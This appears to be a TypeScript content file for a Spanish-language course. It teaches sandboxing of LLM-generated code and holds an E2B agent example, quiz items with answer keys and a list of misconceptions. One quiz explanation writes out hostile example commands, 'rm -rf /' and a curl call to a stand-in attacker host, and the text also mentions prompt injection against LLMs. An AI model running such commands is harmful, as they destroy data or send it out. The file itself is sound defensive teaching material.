import type { ConceptDetails } from '../../schema'

const details: ConceptDetails = {
  reviewedAt: '2026-09',
  snippets: [
    {
      title: 'Sandbox con E2B (managed service)',
      lang: 'python',
      code: `from e2b_code_interpreter import Sandbox
import anthropic

client = anthropic.Anthropic()

def run_code_agent(task: str) -> str:
    """Agente que ejecuta código en un sandbox E2B seguro."""
    with Sandbox() as sandbox:  # El sandbox se destruye al salir
        def execute_code(code: str) -> str:
            """Ejecuta código en el sandbox de E2B."""
            execution = sandbox.run_code(code)
            if execution.error:
                return f"Error: {execution.error.name}: {execution.error.value}"
            return execution.text or "[sin output]"

        def write_file(path: str, content: str) -> str:
            """Escribe un archivo en el sandbox."""
            sandbox.files.write(path, content)
            return f"Archivo escrito: {path}"

        def read_file(path: str) -> str:
            """Lee un archivo del sandbox."""
            return sandbox.files.read(path)

        # Herramientas disponibles para el agente
        tools = [
            {
                "name": "execute_code",
                "description": "Ejecuta código Python en un sandbox seguro y aislado",
                "input_schema": {"type": "object", "properties": {"code": {"type": "string", "description": "Código Python a ejecutar"}}, "required": ["code"]},
            },
            {
                "name": "write_file",
                "description": "Escribe contenido en un archivo del sandbox",
                "input_schema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}, "required": ["path", "content"]},
            },
        ]

        executors = {"execute_code": execute_code, "write_file": write_file}
        messages = [{"role": "user", "content": task}]

        for _ in range(10):
            response = client.messages.create(model="claude-opus-5-5", max_tokens=1024, tools=tools, messages=messages)
            if response.stop_reason == "end_turn":
                return response.content[0].text

            tool_results = []
            for block in response.content:
                if block.type == "tool_use":
                    result = executors.get(block.name, lambda **kw: "Herramienta no disponible")(**block.input)
                    tool_results.append({"type": "tool_result", "tool_use_id": block.id, "content": str(result)})

            messages.extend([{"role": "assistant", "content": response.content}, {"role": "user", "content": tool_results}])

    return "Límite de pasos alcanzado"

result = run_code_agent("Analiza este dataset: [1, 2, 3, 4, 5, 100]. Calcula media, mediana, y detecta outliers.")
print(result)
`,
      deps: { e2b_code_interpreter: '>=1.0', anthropic: '>=0.40' },
      verifiedAt: '2026-09',
      note: 'E2B crea sandboxes en segundos con librerías Python preinstaladas. El sandbox se destruye automáticamente al salir del `with`. Requiere E2B_API_KEY en el entorno.',
    },
  ],
  quiz: [
    {
      q: '¿Por qué es OBLIGATORIO usar un sandbox para código generado por LLMs en producción?',
      options: [
        'Porque el código generado por un LLM puede (accidentalmente o por injection) contener código destructivo (borrar archivos, ejecutar comandos de sistema, exfiltrar datos). El sandbox aísla el código del sistema host.',

        'Por rendimiento.',

        'Por requisitos de licencia.',
        'Para mejorar la calidad del código.',
      ],
      answer: 0,
      explain:
        'Un LLM puede generar "rm -rf /", "os.system(\'curl attacker.com\')" o cualquier otra instrucción peligrosa, ya sea por error, por injection o por adversarial prompts. Sin sandbox, ejecutar este código con exec() o subprocess en el sistema host podría ser catastrófico.',
    },
    {
      q: '¿Cuál es la diferencia entre un sandbox Docker self-hosted y un servicio como E2B?',
      options: [
        'Docker es menos seguro.',
        'Docker self-hosted requiere gestionar la infraestructura, la imagen, los límites de recursos y la limpieza. E2B y servicios similares gestionan esto por ti como API — arrancan en segundos, tienen límites predefinidos, y se destruyen automáticamente.',
        'E2B solo funciona con Python.',
        'No hay diferencia práctica.',
      ],
      answer: 1,
      explain:
        'Docker self-hosted da más control y puede ser más barato a escala, pero requiere configuración, mantenimiento y gestión de seguridad de la infraestructura. Los servicios gestionados como E2B, Modal o Anthropic Managed Agents son más rápidos de integrar y mantener, a un coste por uso.',
    },
    {
      q: '¿Qué restricción es la más crítica para un sandbox que ejecuta código de LLMs?',
      options: [
        'Limitar la velocidad de CPU.',
        'Limitar el número de líneas de código.',

        'Deshabilitar el acceso a red (o limitarlo a endpoints autorizados), ya que un código malicioso podría exfiltrar datos a un servidor externo aunque esté en un contenedor aislado.',

        'Requerir que el código sea Python.',
      ],
      answer: 2,
      explain:
        'Un sandbox con acceso completo a internet puede usarse para exfiltrar datos (enviar archivos a un servidor externo) o para descargar y ejecutar malware adicional. `network_disabled=True` en Docker o el equivalente en el servicio gestionado es la primera restricción a aplicar.',
    },
    {
      q: '¿Cuándo es apropiado usar `ast.literal_eval` en lugar de un sandbox completo?',
      options: [
        'Siempre que sea posible.',
        'Solo para evaluar expresiones muy simples (literales Python, operaciones matemáticas básicas) donde el conjunto completo de operaciones permitidas es pequeño y conocido. Para código arbitrario, siempre se necesita un sandbox.',
        'Para código generado por usuarios confiables.',
        'Cuando el código no usa imports.',
      ],
      answer: 1,
      explain:
        'ast.literal_eval solo evalúa literales Python (strings, números, listas, dicts). Es seguro para ese subconjunto pero completamente insuficiente para código real. Un atacante que puede escribir código Python arbitrario puede evadir restricciones basadas en AST de formas creativas. Solo usar para casos muy limitados y bien definidos.',
    },
  ],
  misconceptions: [
    {
      myth: 'Si el LLM es de confianza (Claude, GPT-4), no necesito sandbox para su código.',
      reality:
        'Incluso los mejores LLMs pueden generar código accidentalmente peligroso, ser víctimas de prompt injection indirecta (una instrucción en datos externos), o producir código con efectos secundarios inesperados. El sandbox protege también de los errores honestos, no solo de los ataques.',
    },
    {
      myth: 'Un sandbox Docker con --network=none es suficiente para cualquier caso.',
      reality:
        'network_disabled elimina la exfiltración de datos por red, pero hay otros vectores: escribir en el filesystem del host si los volumes no están correctamente configurados, consumir todos los recursos del sistema (fork bomb), o escapar del contenedor si hay vulnerabilidades en Docker. La defensa en profundidad (red + filesystem read-only + límites de CPU/memoria + timeout) es más robusta.',
    },
  ],
  sources: [
    {
      title: 'E2B · Code Interpreter SDK',
      url: 'https://e2b.dev/docs',
      kind: 'docs',
    },
    {
      title: 'Docker · Security best practices',
      url: 'https://docs.docker.com/engine/security/',
      kind: 'docs',
    },
  ],
}

export default details
